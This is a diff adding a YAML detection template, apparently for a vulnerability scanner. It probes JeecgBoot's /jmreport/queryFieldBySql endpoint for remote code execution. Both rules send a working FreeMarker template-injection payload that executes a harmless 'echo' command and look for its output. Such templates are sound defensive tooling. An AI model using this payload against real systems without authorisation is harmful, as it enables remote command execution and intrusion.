@@ -1,0 +1,26 @@
+name: JeecgBoot-queryFieldBySql-RCE
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jmreport/queryFieldBySql
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"echo Rscan_test\") }'","dbSource":"","type":"0"}
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
+  - method: POST
+    path: /jeecg-boot/jmreport/queryFieldBySql
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"echo Rscan_test\") }'" }
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
